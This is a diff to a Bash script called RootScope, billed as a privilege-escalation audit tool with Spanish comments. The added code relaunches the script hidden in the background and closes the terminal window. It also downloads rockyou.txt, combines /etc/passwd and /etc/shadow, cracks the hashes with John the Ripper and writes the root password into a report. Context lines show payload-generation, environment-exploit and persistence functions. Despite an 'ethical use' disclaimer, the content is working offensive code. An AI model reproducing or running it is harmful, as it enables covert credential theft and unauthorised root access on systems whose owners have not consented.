@@ -2,10 +2,10 @@
 
 # RootScope - Auditoría avanzada de escalada de privilegios en Bash puro
 # Compatible con Linux, macOS y Windows (vía WSL, Git Bash o Cygwin)
-# Genera un reporte en PDF con vulnerabilidades detectadas
+# Incluye crackeo de contraseñas en Linux con rockyou.txt y ejecución en segundo plano
 # Uso ético y responsable únicamente en entornos autorizados
 
-# Colores para la salida en terminal
+# Colores para la salida en terminal (solo si no está en background)
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 NC='\033[0m' # Sin color
@@ -22,14 +22,28 @@ echo "" >> "$TEMP_FILE"
 
 # **Funciones de salida**
 report() { 
-    echo -e "${GREEN}[+] $1${NC}"
+    [ -t 1 ] && echo -e "${GREEN}[+] $1${NC}" # Solo muestra en terminal si no está en background
     echo "- **INFO**: $1" >> "$TEMP_FILE"
 }
 warning() { 
-    echo -e "${RED}[!] Vulnerabilidad: $1${NC}"
+    [ -t 1 ] && echo -e "${RED}[!] Vulnerabilidad: $1${NC}"
     echo "- **ALERTA**: $1" >> "$TEMP_FILE"
 }
 simulate() { [ "$1" = "--simulate" ] && echo "[SIMULACIÓN] $2" || eval "$2"; }
+
+# **Ejecutar en segundo plano y cerrar ventana**
+if [ "$OS" != "Windows" ]; then
+    # Linux/macOS: Ejecuta en background y cierra terminal
+    if [ -t 1 ]; then
+        nohup "$0" "$@" >/dev/null 2>&1 & disown
+        exit 0
+    fi
+else
+    # Windows (WSL/Git Bash): Intenta minimizar impacto visual
+    if [ -t 1 ]; then
+        cmd.exe /c start /min bash "$0" "$@" & exit 0
+    fi
+fi
 
 # **1. Detección del sistema operativo**
 OS=$(uname -s 2>/dev/null || echo "Windows")
@@ -228,7 +242,43 @@ check_rootkits() {
     fi
 }
 
-# **4. Creación de payloads/exploits**
+# **4. Explotación de contraseñas en Linux con rockyou.txt**
+crack_passwords() {
+    if [ "$OS" == "Linux" ]; then
+        report "Intentando crackear contraseñas con rockyou.txt..."
+        if [ -r /etc/shadow ] && command -v unshadow >/dev/null 2>&1 && command -v john >/dev/null 2>&1; then
+            # Descargar rockyou.txt si no existe
+            ROCKYOU="/usr/share/wordlists/rockyou.txt"
+            if [ ! -f "$ROCKYOU" ]; then
+                if command -v curl >/dev/null 2>&1; then
+                    report "Descargando rockyou.txt..."
+                    curl -s -o "$ROCKYOU.gz" "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt.gz"
+                    gunzip "$ROCKYOU.gz" 2>/dev/null
+                else
+                    warning "curl no disponible. Descarga rockyou.txt manualmente a /usr/share/wordlists/rockyou.txt"
+                    return
+                fi
+            fi
+            # Extraer hash de root y crackear
+            unshadow /etc/passwd /etc/shadow > hashfile 2>/dev/null
+            john --wordlist="$ROCKYOU" --format=sha512crypt hashfile > john_output 2>/dev/null
+            CRACKED=$(john --show hashfile 2>/dev/null | grep "root")
+            if [ -n "$CRACKED" ]; then
+                warning "Contraseña de root crackeada: $CRACKED"
+                echo "``````" >> "$TEMP_FILE"
+                echo "$CRACKED" >> "$TEMP_FILE"
+                echo "``````" >> "$TEMP_FILE"
+            else
+                report "No se crackearon contraseñas con rockyou.txt."
+            fi
+            rm -f hashfile john_output
+        else
+            warning "No se puede crackear: falta acceso a /etc/shadow o john no está instalado."
+        fi
+    fi
+}
+
+# **5. Creación de payloads/exploits**
 create_payload() {
     report "Generando payload multi-etapa..."
     PAYLOAD_FILE="payload_$(date +%s)"
@@ -263,7 +313,7 @@ exploit_env() {
     fi
 }
 
-# **5. Persistencia**
+# **6. Persistencia**
 add_persistence() {
     report "Añadiendo persistencia avanzada..."
     if [ "$OS" == "Linux" ]; then
@@ -292,6 +342,7 @@ main() {
     check_sessions
     check_nfs_smb
     check_rootkits
+    crack_passwords
     create_payload
     exploit_env
     add_persistence "$1"
